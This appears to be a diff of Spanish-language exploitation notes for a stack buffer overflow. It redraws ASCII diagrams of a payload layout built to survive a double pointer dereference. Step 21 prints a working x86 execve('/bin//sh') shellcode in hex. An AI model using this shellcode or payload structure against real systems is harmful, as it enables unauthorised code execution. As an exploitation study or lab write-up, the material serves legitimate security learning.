@@ -185,23 +185,26 @@ Con la herramienta online no da un offset de 108
     La primera desreferencia va ha obtener [addr shellcode] para luego desreferenciar los 4 bytes del shellcode dando un crash
     [shelcode] + [offset] + [addr shelcode] 
       ^                          |
-      |--------------------------v ; Primera desreferencia           ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+      |                          |
+      +--------------------------+ ; Primera desreferencia           ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
 
     [shelcode] + [offset] + [addr shelcode] 
-      v
       |
-      ---[...]---> [invalid addres] ; Segunda desreferencia = crash  ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+      |
+      +--[...]---> [invalid addres] ; Segunda desreferencia = crash  ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   
   Para solucionar esto podemos insertar antes del shellcode otra vez la dirección donde está el shellcode de esta manera
     [addr shelcode] + [shelcode] + [offset] + [addr shelcode] 
     Quedando así
     [addr shelcode] + [shelcode] + [offset] + [addr shelcode] 
-      ^                                           v
-      |-------------------------------------------|; Primera desreferencia  ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
+      ^                                           |
+      |                                           |
+      +-------------------------------------------+; Primera desreferencia  ->  0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
 
     [addr shelcode] + [shelcode] + [offset] + [addr shelcode] ->  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
       |                    ^ 
-      v--------------------|
+      |                    |
+      +--------------------+
 
 21.- Lo último que necesitamos es el shellcode que podemos obtenerlo de aquí: https://shell-storm.org/shellcode/files/shellcode-841.html
   \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
